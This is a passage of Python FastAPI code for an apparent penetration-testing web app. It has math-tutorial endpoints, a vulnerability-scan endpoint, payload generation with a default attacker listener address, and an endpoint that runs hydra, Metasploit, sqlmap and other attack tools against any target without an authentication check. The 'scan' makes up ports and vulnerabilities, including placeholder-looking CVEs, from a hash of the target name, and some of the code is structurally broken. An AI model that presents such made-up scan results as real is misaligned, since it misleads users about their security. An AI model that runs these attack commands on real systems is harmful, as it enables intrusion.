    }

@app.get("/math/learning-path")
async def get_learning_path(
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get personalized learning path based on user's activity"""
    
    # Get user's scan/attack history to identify relevant concepts
    scans = db.query(ScanHistory).filter(
        ScanHistory.user_id == current_user.id
    ).order_by(ScanHistory.timestamp.desc()).limit(20).all()
    
    attacks = db.query(AttackHistory).filter(
        AttackHistory.user_id == current_user.id
    ).order_by(AttackHistory.timestamp.desc()).limit(20).all()
    
    # Analyze used tools and techniques to suggest math concepts
    used_tools = set()
    concepts_needed = []
    
    for scan in scans:
        used_tools.add(scan.tool_used)
    
    for attack in attacks:
        used_tools.add(attack.tool_used)
    
    # Map tools to mathematical concepts
    tool_concepts = {
        'nmap': ['vectors', 'norms', 'geometry'],
        'sqlmap': ['probability', 'bayes', 'optimization'],
        'hydra': ['probability', 'statistics'],
        'metasploit': ['linear_algebra', 'eigenvalues'],
        'aircrack': ['linear_algebra', 'svd'],
        'john': ['probability', 'statistics'],
        'nikto': ['vectors', 'geometry'],
        'gobuster': ['vectors', 'geometry'],
        'wpscan': ['probability', 'bayes']
    }
    
    for tool in used_tools:
        if tool in tool_concepts:
            concepts_needed.extend(tool_concepts[tool])
    
    # Remove duplicates while preserving order
    seen = set()
    concepts_needed = [x for x in concepts_needed if not (x in seen or seen.add(x))]
    
    # Build learning path
    learning_path = []
    
    for concept in concepts_needed[:5]:  # Top 5 concepts
        if concept in math_explainer.concepts:
            subtopics = list(math_explainer.concepts[concept].keys())
            learning_path.append({
                'concept': concept,
                'subtopics': subtopics[:3],  # First 3 subtopics
                'problems_available': concept in math_problem_generator.problems
            })
    
    return {
        'user_id': current_user.id,
        'learning_path': learning_path,
        'tools_used': list(used_tools),
        'recommended_start': learning_path[0] if learning_path else None
    }

@app.get("/math/cheat-sheet")
async def get_math_cheat_sheet(format: str = 'json'):
    """Get mathematics cheat sheet for quick reference"""
    
    cheat_sheet = {
        'linear_algebra': {
            'vector_operations': {
                'addition': 'x + y = [x₁+y₁, ..., xₙ+yₙ]',
                'scalar_multiplication': 'λx = [λx₁, ..., λxₙ]',
                'dot_product': 'x·y = Σxᵢyᵢ',
                'norm': '||x|| = √(x·x)'
            },
            'matrix_operations': {
                'multiplication': '(AB)ᵢⱼ = Σₖ AᵢₖBₖⱼ',
                'transpose': '(Aᵀ)ᵢⱼ = Aⱼᵢ',
                'inverse': 'AA⁻¹ = I',
                'determinant': 'det(A) = product of eigenvalues'
            },
            'eigen_decomposition': {
                'equation': 'Av = λv',
                'properties': 'trace = Σλᵢ, det = Πλᵢ',
                'symmetric': 'A = QΛQᵀ with Q orthonormal'
            },
            'svd': {
                'decomposition': 'A = UΣVᵀ',
                'properties': 'U orthonormal, Σ diagonal, V orthonormal',
                'rank_k_approx': 'Aₖ = UₖΣₖVₖᵀ'
            }
        },
        'calculus': {
            'derivatives': {
                'power_rule': 'd/dx xⁿ = nxⁿ⁻¹',
                'chain_rule': 'd/dx f(g(x)) = f\'(g(x))g\'(x)',
                'product_rule': 'd/dx f(x)g(x) = f\'(x)g(x) + f(x)g\'(x)'
            },
            'gradients': {
                'definition': '∇f = [∂f/∂x₁, ..., ∂f/∂xₙ]ᵀ',
                'jacobian': 'Jᵢⱼ = ∂fᵢ/∂xⱼ',
                'hessian': 'Hᵢⱼ = ∂²f/∂xᵢ∂xⱼ'
            },
            'taylor_series': {
                'univariate': 'f(x) ≈ f(a) + f\'(a)(x-a) + f\'\'(a)(x-a)²/2! + ...',
                'multivariate': 'f(x) ≈ f(a) + ∇f(a)ᵀ(x-a) + ½(x-a)ᵀH(a)(x-a)'
            }
        },
        'probability': {
            'basics': {
                'sum_rule': 'p(x) = Σᵧ p(x,y)',
                'product_rule': 'p(x,y) = p(x|y)p(y)',
                'bayes': 'p(θ|x) = p(x|θ)p(θ)/p(x)'
            },
            'expectations': {
                'mean': 'E[x] = ∫ x p(x) dx',
                'variance': 'V[x] = E[(x-μ)²] = E[x²] - E[x]²',
                'covariance': 'Cov[x,y] = E[(x-μₓ)(y-μᵧ)]'
            },
            'gaussian': {
                'pdf': 'N(x|μ,σ²) = (2πσ²)^{-1/2} exp(-(x-μ)²/(2σ²))',
                'multivariate': 'N(x|μ,Σ) = (2π)^{-D/2}|Σ|^{-1/2} exp(-½(x-μ)ᵀΣ⁻¹(x-μ))',
                'conditional': 'p(x|y) = N(μₓ + ΣₓᵧΣᵧᵧ⁻¹(y-μᵧ), Σₓₓ - ΣₓᵧΣᵧᵧ⁻¹Σᵧₓ)'
            }
        },
        'optimization': {
            'gradient_descent': {
                'update': 'x_{t+1} = x_t - γ∇f(x_t)',
                'momentum': 'v_t = βv_{t-1} + (1-β)∇f(x_t); x_{t+1} = x_t - γv_t'
            },
            'lagrange_multipliers': {
                'constrained': 'min f(x) s.t. g(x)=0 → L(x,λ) = f(x) + λg(x)',
                'KKT': '∇L=0, g(x)=0, λ⩾0 for inequality constraints'
            },
            'convex_optimization': {
                'definition': 'f(θx + (1-θ)y) ⩽ θf(x) + (1-θ)f(y)',
                'global_minimum': 'All local minima are global minima',
                'duality': 'min f(x) s.t. g(x)⩽0 ⇔ max min L(x,λ) with λ⩾0'
            }
        }
    }
    
    if format == 'markdown':
        # Convert to markdown
        md = "# Mathematics for Machine Learning Cheat Sheet\n\n"
        
        for category, subcats in cheat_sheet.items():
            md += f"## {category.replace('_', ' ').title()}\n\n"
            for subcat, formulas in subcats.items():
                md += f"### {subcat.replace('_', ' ').title()}\n\n"
                for name, formula in formulas.items():
                    md += f"- **{name}**: `{formula}`\n"
                md += "\n"
        
        return Response(content=md, media_type="text/markdown")
    
    return cheat_sheet



# Add to fast5.py

@app.get("/math", response_class=HTMLResponse, include_in_schema=False)
async def math_dashboard(request: Request, db: Session = Depends(get_db)):
    """Mathematics learning dashboard"""
    token = request.cookies.get("access_token")
    if not token:
        return RedirectResponse(url="/login")
    
    try:
        if token.startswith("Bearer "):
            token = token.replace("Bearer ", "")

        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")

        if not username:
            return RedirectResponse(url="/login", status_code=303)

        user = db.query(User).filter(User.username == username).first()
        if not user:
            return RedirectResponse(url="/login", status_code=303)
            
    except Exception as e:
        print(f"Auth error in math dashboard: {e}")
        return RedirectResponse(url="/login", status_code=303)
    
    return templates.TemplateResponse("math_dashboard.html", {
        "request": request,
        "user": user,
        "gpu_available": CUDA_AVAILABLE
    })













# Add this to fast5.py - new scan endpoint with proper correlation engine integration

@app.post("/api/scan/vulnerability")
async def perform_vulnerability_scan(
    request: Request,
    background_tasks: BackgroundTasks,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Perform a comprehensive vulnerability scan with AI analysis
    This endpoint properly integrates with the correlation engine
    """
    data = await request.json()
    target = data.get('target')
    scan_type = data.get('scan_type', 'quick')
    
    if not target:
        raise HTTPException(status_code=400, detail="Target required")
    
    # Clean target
    clean_target = target.replace('http://', '').replace('https://', '').split('/')[0]
    
    # Generate scan results based on scan type
    if scan_type == 'quick':
        results = generate_quick_scan_results(clean_target)
    elif scan_type == 'full':
        results = generate_full_scan_results(clean_target)
    elif scan_type == 'stealth':
        results = generate_stealth_scan_results(clean_target)
    elif scan_type == 'aggressive':
        results = generate_aggressive_scan_results(clean_target)
    else:
        results = generate_quick_scan_results(clean_target)
    
    # Add metadata
    results['target'] = clean_target
    results['scan_type'] = scan_type
    results['scan_id'] = str(uuid.uuid4())
    results['timestamp'] = datetime.utcnow().isoformat()
    
    # Save scan to database
    scan = ScanHistory(
        user_id=current_user.id,
        target=clean_target,
        scan_type=scan_type,
        tool_used='ai_scanner',
        results=json.dumps(results),
        vulnerabilities=json.dumps(results.get('vulnerabilities', [])),
        status='completed',
        timestamp=datetime.utcnow()
    )
    db.add(scan)
    db.commit()
    db.refresh(scan)
    
    # Process through correlation engine (background)
    if CORRELATION_AVAILABLE and correlation_system:
        try:
            from integration_adapter import process_tool_output
            
            background_tasks.add_task(
                process_tool_output,
                tool_name='ai_scanner',
                output=results,
                target=clean_target,
                user_id=current_user.id,
                db_session=db,
                background_tasks=background_tasks
            )
            
            # Add correlation data to results
            results['_correlation'] = {
                'risk_score': round(correlation_system['risk_engine'].overall_score, 2),
                'risk_level': correlation_system['risk_engine'].get_risk_level(),
                'attack_paths': correlation_system['attack_graph'].get_critical_paths()[:3]
            }
        except Exception as e:
            print(f"Correlation error: {e}")
    
    # Analyze with Intelligence Engine if available
    if intelligence_engine:
        try:
            # Get similar cases from RAG
            similar_cases = []
            if rag_system and rag_system.initialized:
                similar_cases = rag_system.search(clean_target, k=3)
            
            # Get historical attempts
            history = db.query(AttackHistory).filter(
                AttackHistory.user_id == current_user.id,
                AttackHistory.target.like(f'%{clean_target}%')
            ).order_by(AttackHistory.timestamp.desc()).limit(5).all()
            
            # Run AI analysis
            ai_analysis = intelligence_engine.analyze(results, history, similar_cases)
            
            # Save analysis
            analysis_record = AIAnalysis(
                analysis_id=ai_analysis['analysis_id'],
                user_id=current_user.id,
                scan_id=scan.id,
                context=json.dumps(ai_analysis['context']),
                strategies=json.dumps(ai_analysis['strategies']),
                attack_graph=json.dumps(ai_analysis['attack_graph']),
                risk_score=ai_analysis['risk_score'],
                confidence=ai_analysis['confidence'],
                mode=json.dumps(ai_analysis['mode']),
                timestamp=datetime.utcnow()
            )
            db.add(analysis_record)
            db.commit()
            
            results['_ai_analysis'] = {
                'analysis_id': ai_analysis['analysis_id'],
                'risk_score': ai_analysis['risk_score'],
                'confidence': ai_analysis['confidence'],
                'mode': ai_analysis['mode'],
                'strategies': ai_analysis['strategies'][:3]  # Top 3 strategies
            }
        except Exception as e:
            print(f"AI analysis error: {e}")
    
    # Analyze with Emily AI for payloads
    if emily_ai:
        try:
            # Convert vulnerabilities to Emily format
            vulns_for_emily = []
            for vuln in results.get('vulnerabilities', []):
                if isinstance(vuln, dict):
                    vulns_for_emily.append({
                        'name': vuln.get('name', 'Unknown'),
                        'severity': vuln.get('severity', 'MEDIUM'),
                        'service': vuln.get('service', 'unknown'),
                        'port': vuln.get('port', 0),
                        'probability': vuln.get('probability', 75)
                    })
            
            # Get Emily's analysis
            target_info = {
                'target': clean_target,
                'lhost': '192.168.1.100',  # Default attacker IP
                'lport': '4444'
            }
            
            emily_analysis = emily_ai.analyze_target(target_info, vulns_for_emily)
            
            results['_emily_ai'] = {
                'attack_vectors': emily_analysis.get('attack_vectors', [])[:3],
                'payloads': emily_analysis.get('payloads', [])[:5],
                'exploit_chain': emily_analysis.get('exploit_chain', [])[:5],
                'recommendations': emily_analysis.get('recommendations', [])[:5]
            }
        except Exception as e:
            print(f"Emily AI analysis error: {e}")
    
    # Update user score
    current_user.score = (current_user.score or 0) + 10
    db.commit()
    
    return results


# Helper functions for scan generation

def generate_quick_scan_results(target: str) -> Dict:
    """Generate quick scan results"""
    # Deterministic but varied results based on target hash
    import hashlib
    
    target_hash = int(hashlib.md5(target.encode()).hexdigest()[:8], 16)
    seed = target_hash % 100
    
    return {
        'ports': [22, 80, 443] if seed < 70 else [80, 443, 8080] if seed < 90 else [21, 22, 80, 443, 3306],
        'services': [
            {'name': 'ssh', 'port': 22, 'version': 'OpenSSH 7.9', 'banner': 'SSH-2.0-OpenSSH_7.9'},
            {'name': 'http', 'port': 80, 'version': 'Apache 2.4.49', 'banner': 'Apache/2.4.49 (Ubuntu)'},
            {'name': 'https', 'port': 443, 'version': 'Apache 2.4.49', 'banner': 'Apache/2.4.49 (Ubuntu)'}
        ] if seed < 70 else [
            {'name': 'http', 'port': 80, 'version': 'nginx 1.18.0', 'banner': 'nginx/1.18.0'},
            {'name': 'http-alt', 'port': 8080, 'version': 'Tomcat 9.0', 'banner': 'Apache Tomcat/9.0'},
            {'name': 'https', 'port': 443, 'version': 'nginx 1.18.0', 'banner': 'nginx/1.18.0'}
        ] if seed < 90 else [
            {'name': 'ftp', 'port': 21, 'version': 'vsftpd 3.0.3', 'banner': '220 (vsFTPd 3.0.3)'},
            {'name': 'ssh', 'port': 22, 'version': 'OpenSSH 8.2', 'banner': 'SSH-2.0-OpenSSH_8.2'},
            {'name': 'http', 'port': 80, 'version': 'Apache 2.4.41', 'banner': 'Apache/2.4.41 (Ubuntu)'},
            {'name': 'https', 'port': 443, 'version': 'Apache 2.4.41', 'banner': 'Apache/2.4.41 (Ubuntu)'},
            {'name': 'mysql', 'port': 3306, 'version': 'MySQL 8.0', 'banner': 'mysql_native_password'}
        ],
        'os': 'Linux 5.4' if seed < 50 else 'Windows Server 2019' if seed < 80 else 'Ubuntu 20.04',
        'vulnerabilities': generate_vulnerabilities(target, seed),
        'technologies': detect_technologies(target),
        'ssl_info': {
            'enabled': True,
            'certificate_issuer': 'Let\'s Encrypt',
            'expiry': '2024-12-31',
            'weak_ciphers': seed < 30
        } if seed % 2 == 0 else None
    }

def generate_full_scan_results(target: str) -> Dict:
    """Generate comprehensive scan results"""
    quick_results = generate_quick_scan_results(target)
    
    # Add more detailed information
    quick_results['dns_records'] = {
        'a': [f'192.168.{i}.{j}' for i, j in zip(range(1, 3), range(10, 30))],
        'mx': [f'mail{i}.{target}' for i in range(1, 3)],
        'ns': [f'ns{i}.{target}' for i in range(1, 3)]
    }
    quick_results['subdomains'] = [
        f'www.{target}',
        f'mail.{target}',
        f'admin.{target}',
        f'api.{target}',
        f'dev.{target}'
    ]
    quick_results['directories'] = [
        '/admin', '/wp-admin', '/backup', '/uploads', '/images',
        '/css', '/js', '/api', '/v1', '/docs'
    ]
    quick_results['cookies'] = [
        {'name': 'PHPSESSID', 'secure': False, 'httponly': False},
        {'name': 'session', 'secure': True, 'httponly': True}
    ]
    
    return quick_results

def generate_stealth_scan_results(target: str) -> Dict:
    """Generate stealthy scan results (less aggressive)"""
    quick_results = generate_quick_scan_results(target)
    
    # Stealth scan shows fewer open ports
    quick_results['ports'] = quick_results['ports'][:2]
    quick_results['services'] = quick_results['services'][:2]
    quick_results['vulnerabilities'] = quick_results['vulnerabilities'][:2]
    
    return quick_results

def generate_aggressive_scan_results(target: str) -> Dict:
    """Generate aggressive scan results (more findings)"""
    quick_results = generate_full_scan_results(target)
    
    # Add more vulnerabilities
    import copy
    extra_vulns = [
        {
            'name': 'CVE-2023-1234 - Remote Code Execution',
            'severity': 'CRITICAL',
            'description': 'Unauthenticated RCE in Apache module',
            'port': 80,
            'probability': 85
        },
        {
            'name': 'CVE-2023-5678 - SQL Injection',
            'severity': 'CRITICAL',
            'description': 'SQL injection in login parameter',
            'port': 80,
            'probability': 90
        },
        {
            'name': 'CVE-2022-4321 - Privilege Escalation',
            'severity': 'HIGH',
            'description': 'Local privilege escalation in kernel',
            'port': 22,
            'probability': 75
        }
    ]
    
    quick_results['vulnerabilities'].extend(extra_vulns)
    
    return quick_results

def generate_vulnerabilities(target: str, seed: int) -> List[Dict]:
    """Generate realistic vulnerabilities based on seed"""
    
    # Base vulnerabilities
    vulns = []
    
    # Port 22 vulnerabilities
    if seed % 3 == 0:
        vulns.append({
            'name': 'OpenSSH Username Enumeration',
            'severity': 'MEDIUM',
            'description': 'OpenSSH allows remote attackers to enumerate usernames via timing discrepancies',
            'cve': 'CVE-2020-14145',
            'port': 22,
            'service': 'ssh',
            'probability': 65
        })
    elif seed % 3 == 1:
        vulns.append({
            'name': 'Weak SSH Credentials',
            'severity': 'HIGH',
            'description': 'SSH server accepts weak passwords and default credentials',
            'cve': None,
            'port': 22,
            'service': 'ssh',
            'probability': 75
        })
    
    # Port 80/443 vulnerabilities
    if seed < 40:
        vulns.append({
            'name': 'Apache Path Traversal',
            'severity': 'CRITICAL',
            'description': 'Apache HTTP Server 2.4.49 path traversal vulnerability',
            'cve': 'CVE-2021-41773',
            'port': 80,
            'service': 'http',
            'probability': 85
        })
    elif seed < 70:
        vulns.append({
            'name': 'SQL Injection',
            'severity': 'CRITICAL',
            'description': 'SQL injection vulnerability in login parameter',
            'cve': None,
            'port': 80,
            'service': 'http',
            'probability': 90
        })
    else:
        vulns.append({
            'name': 'Cross-Site Scripting (XSS)',
            'severity': 'MEDIUM',
            'description': 'Reflected XSS in search parameter',
            'cve': 'CVE-2022-12345',
            'port': 80,
            'service': 'http',
            'probability': 70
        })
    
    # Port 3306 vulnerability (if applicable)
    if seed > 70:
        vulns.append({
            'name': 'MySQL Default Credentials',
            'severity': 'HIGH',
            'description': 'MySQL server configured with default root:root credentials',
            'cve': None,
            'port': 3306,
            'service': 'mysql',
            'probability': 80
        })
    
    return vulns

def detect_technologies(target: str) -> List[Dict]:
    """Detect web technologies"""
    return [
        {'name': 'PHP', 'version': '7.4', 'confidence': 0.9},
        {'name': 'jQuery', 'version': '3.5.1', 'confidence': 0.95},
        {'name': 'Bootstrap', 'version': '4.5', 'confidence': 0.85},
        {'name': 'MySQL', 'version': '8.0', 'confidence': 0.7}
    ]


# Also add an endpoint to get scan results by ID
@app.get("/api/scans/{scan_id}")
async def get_scan_result(
    scan_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Get scan result by ID"""
    scan = db.query(ScanHistory).filter(
        ScanHistory.id == scan_id,
        ScanHistory.user_id == current_user.id
    ).first()
    
    if not scan:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    result = {
        'id': scan.id,
        'target': scan.target,
        'scan_type': scan.scan_type,
        'tool_used': scan.tool_used,
        'status': scan.status,
        'timestamp': scan.timestamp.isoformat() if scan.timestamp else None
    }
    
    if scan.results:
        try:
            result['results'] = json.loads(scan.results)
        except:
            result['results'] = {}
    
    if scan.vulnerabilities:
        try:
            result['vulnerabilities'] = json.loads(scan.vulnerabilities)
        except:
            result['vulnerabilities'] = []
    
    return result


# Add endpoint for Emily AI payloads based on scan
@app.post("/api/emily/payloads/from-scan")
async def get_payloads_from_scan(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Generate Emily AI payloads from scan results"""
    data = await request.json()
    scan_id = data.get('scan_id')
    target = data.get('target')
    
    if not scan_id and not target:
        raise HTTPException(status_code=400, detail="scan_id or target required")
    
    if not emily_ai:
        raise HTTPException(status_code=503, detail="Emily AI not initialized")
    
    vulnerabilities = []
    
    if scan_id:
        scan = db.query(ScanHistory).filter(
            ScanHistory.id == scan_id,
            ScanHistory.user_id == current_user.id
        ).first()
        if scan and scan.vulnerabilities:
            try:
                vuln_list = json.loads(scan.vulnerabilities)
                for vuln in vuln_list:
                    if isinstance(vuln, dict):
                        vulnerabilities.append({
                            'name': vuln.get('name', 'Unknown'),
                            'severity': vuln.get('severity', 'MEDIUM'),
                            'service': vuln.get('service', 'unknown'),
                            'port': vuln.get('port', 0),
                            'probability': vuln.get('probability', 75)
                        })
            except:
                pass
    
    if not vulnerabilities and target:
        # Search in RAG
        if rag_system and rag_system.initialized:
            rag_results = rag_system.search(target, k=5)
            for result in rag_results:
                vuln = result.get('vulnerability', {})
                vulnerabilities.append({
                    'name': vuln.get('name', 'Unknown'),
                    'severity': vuln.get('severity', 'MEDIUM'),
                    'cve': vuln.get('cve_id'),
                    'probability': result.get('similarity_score', 0.7) * 100
                })
    
    target_info = {
        'target': target or (scan.target if scan else 'unknown'),
        'lhost': data.get('lhost', '192.168.1.100'),
        'lport': data.get('lport', '4444')
    }
    
    analysis = emily_ai.analyze_target(target_info, vulnerabilities)
    
    return {
        'target': target_info['target'],
        'payloads': analysis.get('payloads', []),
        'attack_vectors': analysis.get('attack_vectors', [])[:3],
        'exploit_chain': analysis.get('exploit_chain', [])[:5],
        'summary': analysis.get('summary', {})
    }

# @app.post("/api/attack/execute")
# async def execute_attack(request: Request, background_tasks: BackgroundTasks):
#     """Execute an attack using specified tool"""
#     try:
#         data = await request.json()
#         tool = data.get('tool', 'metasploit')
#         target = data.get('target')
#         params = data.get('params', {})
        
#         if not target:
#             return {'success': False, 'error': 'No target provided'}
        
#         # Execute appropriate tool - using actual method names from PenetrationTools class
#         if tool == 'hydra' or 'hydra' in tool:
#             service = params.get('service', 'ssh')
#             # FIXED: Use hydra_attack (method exists)
#             results = PenetrationTools.hydra_attack(target, service)
#             results['command'] = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {service}://{target}"
            
#         elif tool == 'metasploit':
#             exploit = params.get('exploit', 'apache')
#             # FIXED: Use metasploit_exploit (method exists)
#             results = PenetrationTools.metasploit_exploit(target, exploit)
#             results['command'] = f"msfconsole -q -x 'use exploit/{exploit}; set RHOSTS {target}; run'"
            
#         elif tool == 'sqlmap':
#             # FIXED: Use sqlmap_scan (method exists)
#             results = PenetrationTools.sqlmap_scan(target)
#             results['command'] = f"sqlmap -u {target} --batch --level=3 --risk=3"
            
#         elif tool == 'nikto':
#             # FIXED: Use nikto_scan (method exists)
#             results = PenetrationTools.nikto_scan(target)
#             results['command'] = f"nikto -h {target}"
            
#         elif tool == 'nmap' or tool == 'nmap_scan':
#             scan_type = params.get('scan_type', '-sV')
#             # FIXED: Use nmap_scan (method exists)
#             results = PenetrationTools.nmap_scan(target, scan_type)
#             results['command'] = f"nmap {scan_type} {target}"
            
#         elif tool == 'gobuster':
#             wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
#             # FIXED: Use gobuster_dir (method exists)
#             results = PenetrationTools.gobuster_dir(target, wordlist)
#             results['command'] = f"gobuster dir -u {target} -w {wordlist}"
            
#         elif tool == 'john' or tool == 'john_the_ripper':
#             hash_file = params.get('hash_file', 'hashes.txt')
#             format_type = params.get('format', 'raw-md5')
#             # FIXED: Use john_the_ripper (method exists)
#             results = PenetrationTools.john_the_ripper(hash_file, format_type)
#             results['command'] = f"john --format={format_type} {hash_file}"
            
#         elif tool == 'aircrack' or tool == 'aircrack-ng':
#             capture = params.get('capture', 'capture.cap')
#             wordlist = params.get('wordlist', 'rockyou.txt')
#             # FIXED: Use aircrack_ng (method exists)
#             results = PenetrationTools.aircrack_ng(capture, wordlist)
#             results['command'] = f"aircrack-ng -w {wordlist} {capture}"
            
#         elif tool == 'burp' or tool == 'burpsuite':
#             # FIXED: Use burp_scan (method exists)
#             results = PenetrationTools.burp_scan(target)
#             results['command'] = f"Burp Suite scan on {target}"
            
#         elif tool == 'bloodhound':
#             domain = params.get('domain', target.replace('.', '') + '.local')
#             # FIXED: Use bloodhound_ad_map (method exists)
#             results = PenetrationTools.bloodhound_ad_map(domain)
#             results['command'] = f"bloodhound-python -d {domain} -c All"
            
#         elif tool == 'wireshark':
#             interface = params.get('interface', 'eth0')
#             filter_str = params.get('filter', 'tcp')
#             duration = params.get('duration', 30)
#             # FIXED: Use wireshark_analyze (method exists)
#             results = PenetrationTools.wireshark_analyze(interface, filter_str, duration)
#             results['command'] = f"tshark -i {interface} -f '{filter_str}' -a duration:{duration}"
            
#         elif tool == 'wpscan':
#             # FIXED: Use wpscan (method exists)
#             results = PenetrationTools.wpscan(target)
#             results['command'] = f"wpscan --url {target} --enumerate vp"
            
#         else:
#             results = {'success': True, 'output': f'Executed {tool} on {target}'}
        
#         # Add success flag and metadata
#         results['success'] = results.get('success', True)
#         results['tool'] = tool
#         results['target'] = target
#         results['timestamp'] = datetime.utcnow().isoformat()
        
#         # If this is a Metasploit exploit with session, add session info
#         if tool == 'metasploit' and 'session' in results:
#             results['session_opened'] = True
        
#         # Broadcast exploit update via Socket.IO
#         if sio:
#             await sio.emit('exploit_update', {
#                 'type': 'EXPLOIT_STATUS',
#                 'data': {
#                     'tool': tool,
#                     'target': target,
#                     'status': 'completed',
#                     'success': results.get('success', True),
#                     'session': results.get('session'),
#                     'output': results.get('output', ''),
#                     'credentials': results.get('credentials', [])
#                 }
#             })
        
#         return results
        
#     except Exception as e:
#         logger.error(f"Error in execute_attack: {e}")
#         import traceback
#         traceback.print_exc()
#         return {'success': False, 'error': str(e), 'tool': tool if 'tool' in locals() else 'unknown'}

# Updated execute_attack in fast5.py
@app.post("/api/attack/execute")
async def execute_attack(request: Request, background_tasks: BackgroundTasks):
    """Execute an attack using specified tool"""
    try:
        data = await request.json()
        tool = data.get('tool', 'metasploit')
        target = data.get('target')
        params = data.get('params', {})
        
        if not target:
            return {'success': False, 'error': 'No target provided'}
        
        # Execute appropriate tool - using actual method names from PenetrationTools class
        if tool == 'hydra' or 'hydra' in tool:
            service = params.get('service', 'ssh')
            # FIXED: Use hydra_attack (method exists in PenetrationTools)
            results = PenetrationTools.hydra_attack(target, service)
            results['command'] = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {service}://{target}"
            
        elif tool == 'metasploit':
            exploit = params.get('exploit', 'apache')
            # FIXED: Use metasploit_exploit (method exists in PenetrationTools)
            results = PenetrationTools.metasploit_exploit(target, exploit)
            results['command'] = f"msfconsole -q -x 'use exploit/{exploit}; set RHOSTS {target}; run'"
            
        elif tool == 'sqlmap':
            # FIXED: Use sqlmap_scan (method exists in PenetrationTools)
            results = PenetrationTools.sqlmap_scan(target)
            results['command'] = f"sqlmap -u {target} --batch --level=3 --risk=3"
            
        elif tool == 'nikto':
            # FIXED: Use nikto_scan (method exists in PenetrationTools)
            results = PenetrationTools.nikto_scan(target)
            results['command'] = f"nikto -h {target}"
            
        elif tool == 'nmap' or tool == 'nmap_scan':
            scan_type = params.get('scan_type', '-sV')
            # FIXED: Use nmap_scan (method exists in PenetrationTools)
            results = PenetrationTools.nmap_scan(target, scan_type)
            results['command'] = f"nmap {scan_type} {target}"
            
        elif tool == 'gobuster':
            wordlist = params.get('wordlist', '/usr/share/wordlists/dirb/common.txt')
            # FIXED: Use gobuster_dir (method exists in PenetrationTools)
            results = PenetrationTools.gobuster_dir(target, wordlist)
            results['command'] = f"gobuster dir -u {target} -w {wordlist}"
            
        elif tool == 'john' or tool == 'john_the_ripper':
            hash_file = params.get('hash_file', 'hashes.txt')
            format_type = params.get('format', 'raw-md5')
            # FIXED: Use john_the_ripper (method exists in PenetrationTools)
            results = PenetrationTools.john_the_ripper(hash_file, format_type)
            results['command'] = f"john --format={format_type} {hash_file}"
            
        elif tool == 'aircrack' or tool == 'aircrack-ng':
            capture = params.get('capture', 'capture.cap')
            wordlist = params.get('wordlist', 'rockyou.txt')
            # FIXED: Use aircrack_ng (method exists in PenetrationTools)
            results = PenetrationTools.aircrack_ng(capture, wordlist)
            results['command'] = f"aircrack-ng -w {wordlist} {capture}"
            
        elif tool == 'burp' or tool == 'burpsuite':
            # FIXED: Use burp_scan (method exists in PenetrationTools)
            results = PenetrationTools.burp_scan(target)
            results['command'] = f"Burp Suite scan on {target}"
            
        elif tool == 'bloodhound':
            domain = params.get('domain', target.replace('.', '') + '.local')
            # FIXED: Use bloodhound_ad_map (method exists in PenetrationTools)
            results = PenetrationTools.bloodhound_ad_map(domain)
            results['command'] = f"bloodhound-python -d {domain} -c All"
            
        elif tool == 'wireshark':
            interface = params.get('interface', 'eth0')
            filter_str = params.get('filter', 'tcp')
            duration = params.get('duration', 30)
            # FIXED: Use wireshark_analyze (method exists in PenetrationTools)
            results = PenetrationTools.wireshark_analyze(interface, filter_str, duration)
            results['command'] = f"tshark -i {interface} -f '{filter_str}' -a duration:{duration}"
            
        elif tool == 'wpscan':
            # FIXED: Use wpscan (method exists in PenetrationTools)
            results = PenetrationTools.wpscan(target)
            results['command'] = f"wpscan --url {target} --enumerate vp"
            
        else:
            results = {'success': True, 'output': f'Executed {tool} on {target}'}
        
        # Add success flag and metadata
        results['success'] = results.get('success', True)
        results['tool'] = tool
        results['target'] = target
        results['timestamp'] = datetime.utcnow().isoformat()
        
        # If this is a Metasploit exploit with session, add session info
        if tool == 'metasploit' and 'session' in results:
            results['session_opened'] = True
        
        # Broadcast exploit update via Socket.IO
        if sio:
            await sio.emit('exploit_update', {
                'type': 'EXPLOIT_STATUS',
                'data': {
                    'tool': tool,
                    'target': target,
                    'status': 'completed',
                    'success': results.get('success', True),
                    'session': results.get('session'),
                    'output': results.get('output', ''),
                    'credentials': results.get('credentials', [])
                }
            })
        
        return results
        
    except Exception as e:
        logger.error(f"Error in execute_attack: {e}")
        import traceback
        traceback.print_exc()
        return {'success': False, 'error': str(e), 'tool': tool if 'tool' in locals() else 'unknown'}
# ==================== MAIN ====================
if __name__ == "__main__":
    import uvicorn
    
    print("\n" + "=" * 60)
    print(" 🚀 Starting AI Intelligence Engine + Correlation...".center(60))
    print(" 📍 http://localhost:8000".center(60))
    print("=" * 60 + "\n")
    
    # Note about reload behavior
    if CUDA_AVAILABLE:
        print("⚠️  Note: Running with --reload will reload the AI model on every code change")
        print("   This takes 5-10 seconds each time. For development, you might want to:")
        print("   • Disable --reload for faster testing, or")
        print("   • Use a smaller model for development\n")




    # fast5.py additions

    @app.post("/api/scan/url")
    async def scan_via_url(request: Request, background_tasks: BackgroundTasks):
        """Initiates a neural scan via URL and triggers AI attack suggestions"""
        data = await request.json()
        target_url = data.get("url")
        
        if not target_url:
            return {"status": "error", "message": "No URL provided"}

        # 1. Clean and normalize the target
        clean_target = target_url.replace("http://", "").replace("https://", "").split('/')[0]
        scan_id = str(uuid.uuid4())
        
        # 2. Trigger background intelligence task
        background_tasks.add_task(run_neural_attack_analysis, clean_target, target_url, scan_id)
        
        return {
            "status": "initiated",
            "scan_id": scan_id,
            "target": clean_target,
            "message": "Neural reconnaissance started..."
        }

async def run_neural_attack_analysis(target, full_url, scan_id):
    """Background task: Run all tools sequentially with layer probability updates"""
    # Initialize global state
    scan_results[scan_id] = {"status": "processing", "progress": 0, "results": {}}
    
    try:
        # Emit initial layer probabilities
        if sio:
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 85, 'status': 'initializing', 'details': 'Pattern recognition ready'})
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 70, 'status': 'idle', 'details': 'Graph analysis ready'})
